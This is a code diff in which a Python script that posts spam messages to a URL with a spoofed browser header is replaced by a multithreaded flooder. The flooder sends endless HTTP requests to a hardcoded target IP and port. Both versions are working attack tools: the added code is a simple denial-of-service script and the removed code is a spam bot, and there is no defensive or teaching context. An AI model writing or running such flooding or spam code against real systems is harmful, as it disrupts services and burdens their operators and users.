@@ -1,27 +1,34 @@
-import argparse
-import requests
-import time
+import socket
+import threading
 
-def flood(url, count, delay):
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-    }
+def flood(ip, port):
+    while True:
+        try:
+            # Create a socket connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            # Connect to the target IP and port
+            s.connect((ip, port))
+            
+            # Send a message to the target
+            message = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n"
+            s.send(message.encode())
+            
+            # Print a confirmation message
+            print(f"Sent request to {ip}:{port}")
+            
+            # Close the socket connection
+            s.close()
+        except Exception as e:
+            print(f"Error: {e}")
 
-    for i in range(count):
-        data = {'message': f'This is a spam message from a bot'}
-        response = requests.post(url, headers=headers, data=data)
+# Enter the IP address and port of the target
+target_ip = "192.168.0.1"
+target_port = 80
 
-        time.sleep(delay)  # Add a delay between each request
+# Enter the number of threads you want to use for flooding
+num_threads = 10
 
-def main():
-    parser = argparse.ArgumentParser(description='Flood a target URL with spam messages.')
-    parser.add_argument('url', help='The target URL to flood.')
-    parser.add_argument('count', type=int, help='The number of requests to send.')
-    parser.add_argument('delay', type=float, help='The delay time between each request in seconds.')
-
-    args = parser.parse_args()
-
-    flood(args.url, args.count, args.delay)
-
-if __name__ == '__main__':
-    main()
+# Start the bot flood
+for _ in range(num_threads):
+    threading.Thread(target=flood, args=(target_ip, target_port)).start()
